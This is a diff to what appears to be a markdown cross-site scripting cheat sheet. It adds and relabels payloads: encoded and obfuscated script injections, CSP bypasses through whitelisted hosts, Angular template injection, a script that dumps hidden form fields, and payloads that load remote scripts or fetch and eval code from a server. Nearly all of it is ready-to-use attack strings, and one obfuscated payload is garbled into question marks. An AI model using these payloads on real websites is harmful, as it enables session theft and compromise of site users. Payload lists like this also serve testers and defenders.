@@ -6,11 +6,11 @@
 
 ```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```
 
-Double URL encoding
+> Double URL encoding
 
 ```%253Cscript%253Ealert(1)%253C%252Fscript%253E```
 
-XSS in XML
+> XSS in XML
 
 ```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>```
 
@@ -18,11 +18,11 @@ XSS in XML
 
 ```<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>```
 
- Where :// is required after protocol
+> Where :// is required after protocol
 
 ```javascript://%250aalert(1)```
 
-XSS in email addresses
+> XSS in email addresses
 
 ```"\"><s>test"@gmail.com```
   
@@ -42,7 +42,7 @@ XSS in email addresses
 
 ```&lt;script&gt;confirm(1)&lt;/script&gt;```
 
-GET Hidden Fields data
+> GET Hidden Fields data
 
 ```<script>var xss = '';f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}};//'';</script>```
 
@@ -64,7 +64,7 @@ GET Hidden Fields data
 
 ```"><deTails oNToggle=confi\u0072m(1)>"```
 
-Get response back to server
+> Get response back to server
 
 ```<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//127.0.0.1:8080");a.send();</script>```
 
@@ -80,7 +80,7 @@ Get response back to server
 
 ```\'}alert(1);{//```
 
-CSP bypass if http://ajax.googleapis.com is whitelisted
+> CSP bypass if http://ajax.googleapis.com is whitelisted
 
 ```<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>```
 
@@ -89,16 +89,53 @@ CSP bypass if http://ajax.googleapis.com is whitelisted
 ```<script src=data:,alert(1)>```
 
 
-Angular JS XSS
+> Angular JS XSS
 
 ```{{constructor.constructor('alert(1)')()}}```
 
 ```<x ng-app>{{constructor.constructor('alert(1)')()}} ```
 
-Upper Case
+> Upper Case
 
 ```<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>```
 
  ```<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>```
  
 ```data:text/html,<svg onload=alert(1)>```
+
+> Shortest payloads injection
+
+```<a/href=//0>```
+```<script src=//14.rs>```
+
+> Before form Tags
+
+```<k onsubmit=alert(1)>```
+
+```<k oninput=alert(1)>```
+
+```foobar"/%0D<body='X' onmouseover=setInterval`alert\x28&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;\x29`//```
+
+```<script ~~~>confirm(1)</script ~~~>```
+
+```window+=valueOf=alert(1)```
+
+```[][`filter`][`constructor`](`ale`.concat(`rt\x28`.concat`0\x29`))();//```
+
+```<script>([_,_____,_,_,__,___]=(__=[])+{___:__},[______,_,________,____,,_________,_______,__,,,__________]=[!!_____]+!_____+_____._____)[___+=_____+__________+__+______+_+________+___+______+_____+_][___](_________+_______+____+_+______+'(-~_____)')(__)</script>```
+
+```<script>([,?,,,,??]=[]+{},[???,????,?????,??????,,???????,????????,?????????,,,??????????]=[!!?]+!?+?.?)[??+=?+??????????+?????????+???+????+?????+??+???+?+????][??](???????+????????+??????+????+???+'`1`')``</script>```
+
+```"><svG oNLoad=confirm&#x28;1&#x29>```
+
+```<script>this[Object["keys"](this)[6]](1)</script>```
+
+> Space and sladh not working
+
+```<svgonload=alert(1)>```
+ 
+```<xss/ondblclick=[cookie].some(alert)>XSS```
+
+>Hidden field XSS
+
+```"accesskey="X" onclick=alert(1) ```
